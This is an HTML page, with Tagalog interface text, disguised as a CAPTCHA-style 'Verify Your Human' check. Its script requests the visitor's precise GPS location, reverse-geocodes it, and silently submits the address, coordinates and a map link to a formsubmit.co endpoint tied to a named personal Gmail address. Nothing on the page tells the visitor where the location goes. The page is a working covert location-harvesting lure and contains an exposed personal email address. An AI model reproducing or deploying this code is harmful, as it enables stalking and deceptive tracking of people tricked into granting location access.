<!DOCTYPE html>
<html lang="tl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Human</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            padding: 40px 30px;
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .icon {
            font-size: 70px;
            margin-bottom: 10px;
        }
        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #666;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .btn-share {
            background: linear-gradient(135deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn-share:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(76, 175, 80, 0.4);
        }
        .btn-share:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        #resultBox {
            display: none;
            margin-top: 25px;
            padding: 25px;
            background: #f0f9f0;
            border-radius: 12px;
            border: 2px solid #4CAF50;
        }
        .status-success {
            color: #2e7d32;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        .status-error {
            color: #c62828;
            font-size: 16px;
            font-weight: 500;
        }
        .info-block {
            text-align: left;
            padding: 12px 0;
            border-bottom: 1px solid #ddd;
        }
        .info-label {
            font-size: 13px;
            color: #666;
            margin-bottom: 4px;
        }
        .info-value {
            font-size: 15px;
            color: #333;
            font-weight: 500;
            line-height: 1.5;
        }
        .map-btn {
            display: inline-block;
            margin-top: 18px;
            padding: 12px 24px;
            background: #1a73e8;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 500;
        }
        .loading {
            color: #667eea;
            font-size: 16px;
            margin: 20px 0;
        }
        .sending {
            color: #f57c00;
            font-size: 14px;
            margin-top: 10px;
        }
        .sent-confirm {
            color: #2e7d32;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon"></div>
        <h1>Catcha</h1>
        <p class="subtitle"></p>
        
        <button class="btn-share" id="shareBtn" onclick="getLocation()">Verify Your Human</button>
        
        <div id="resultBox">
            <h3 id="statusText"></h3>
            
            <div class="info-block">
                <div class="info-label"> Address</div>
                <div class="info-value" id="addressText">Getting address...</div>
            </div>
            
            <div class="info-block">
                <div class="info-label">Coordinates</div>
                <div class="info-value" id="coordsText">—</div>
            </div>
            
            <p class="sending" id="sendingStatus">📤 Ipinapadala sa email...</p>
            <p class="sent-confirm" id="sentConfirm" style="display:none;"></p>
            
            <a id="mapLink" href="" target="_blank" class="map-btn"></a>
        </div>
    </div>

    <script>
        // ✅ NAILAGAY KO NA ANG EMAIL MO!
        const EMAIL_URL = 'https://formsubmit.co/jamesthroycagabhion@gmail.com';
        
        function getLocation() {
            const shareBtn = document.getElementById('shareBtn');
            const resultBox = document.getElementById('resultBox');
            const statusText = document.getElementById('statusText');
            
            shareBtn.disabled = true;
            shareBtn.textContent = '⏳ Hinihintay ang pahintulot...';
            resultBox.style.display = 'block';
            statusText.className = 'loading';
            statusText.textContent = '⏳ Paki-pili ang "Allow" kapag tinanong ka ng browser...';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    successCallback,
                    errorCallback,
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                statusText.className = 'status-error';
                statusText.textContent = '❌ Hindi sinusuportahan ng device ang lokasyon.';
                shareBtn.disabled = false;
                shareBtn.textContent = ' Subukan Muli';
            }
        }
        
        async function successCallback(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            
            const statusText = document.getElementById('statusText');
            const addressText = document.getElementById('addressText');
            const coordsText = document.getElementById('coordsText');
            const mapLink = document.getElementById('mapLink');
            const shareBtn = document.getElementById('shareBtn');
            
            statusText.className = 'loading';
            statusText.textContent = '✅ Natagpuan! Kinukuha ang address...';
            coordsText.textContent = lat + ', ' + lng;
            mapLink.href = `https://www.google.com/maps?q=${lat},${lng}`;
            
            let address = 'Kalapit na lugar lamang';
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
                const data = await res.json();
                if (data.display_name) {
                    address = data.display_name;
                }
            } catch (e) {
                address = `Lokasyon malapit sa ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
            }
            addressText.textContent = address;
            
            statusText.className = 'status-success';
            statusText.textContent = '✅Matagumpay';
            
            sendToEmail(address, lat, lng);
            shareBtn.style.display = 'none';
        }
        
        function errorCallback(error) {
            const statusText = document.getElementById('statusText');
            const shareBtn = document.getElementById('shareBtn');
            
            statusText.className = 'status-error';
            
            if (error.code === 1) {
                statusText.textContent = '❌ Pinili mong huwag payagan ang lokasyon.';
            } else if (error.code === 2) {
                statusText.textContent = '❌ Hindi mahanap ang lokasyon. I-on ang GPS.';
            } else if (error.code === 3) {
                statusText.textContent = '❌ Natagalan ang paghahanap. Subukan muli.';
            } else {
                statusText.textContent = '❌ May naganap na error.';
            }
            
            shareBtn.disabled = false;
            shareBtn.textContent = '📍 Subukan Muli';
        }
        
        function sendToEmail(address, lat, lng) {
            const sendingStatus = document.getElementById('sendingStatus');
            const sentConfirm = document.getElementById('sentConfirm');
            
            sendingStatus.style.display = 'block';
            sentConfirm.style.display = 'none';
            
            const form = document.createElement('form');
            form.action = EMAIL_URL;
            form.method = 'POST';
            form.target = '_blank';
            
            const hiddenFields = {
                '_subject': 'Bagong Lokasyon na Ibinahagi',
                'Address': address,
                'Coordinates': `${lat}, ${lng}`,
                'Google Maps Link': `https://www.google.com/maps?q=${lat},${lng}`
            };
            
            for (const [name, value] of Object.entries(hiddenFields)) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }
            
            document.body.appendChild(form);
            
            setTimeout(() => {
                sendingStatus.style.display = 'none';
                sentConfirm.style.display = 'block';
            }, 1500);
            
            form.submit();
            document.body.removeChild(form);
        }
    </script>
</body>
</html>
